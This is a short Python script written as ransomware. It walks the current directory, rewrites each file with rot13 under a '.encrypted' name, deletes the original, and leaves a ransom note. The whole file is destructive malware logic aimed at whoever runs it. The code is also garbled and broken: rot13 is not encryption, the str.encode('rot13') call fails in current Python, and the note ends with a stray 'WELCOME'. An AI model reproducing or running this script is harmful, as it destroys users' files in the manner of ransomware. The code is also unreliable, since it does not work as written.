import os
import datetime

date = datetime.datetime.now()

# Create a list of all files in the directory
files = os.listdir('.')

# Encrypt each file in the list
for file in files:
    # Open the file
    with open(file, 'r') as f:
        # Read contents of the file
        data = f.read()
    # Encrypt contents of the file
    encrypted_data = data.encode('rot13')
    # Create a new file with the same name and a .encrypted extension
    new_file = file + '.encrypted'
    # Open new file
    with open(new_file, 'w') as f:
        # Write the encrypted contents to the file
        f.write(encrypted_data)
    # Delete original file
    os.remove(file)

#  ransom note
with open('ransom_note.txt', 'w') as f:
    f.write('Your files have been encrypted.\n')
    f.write('WELCOME')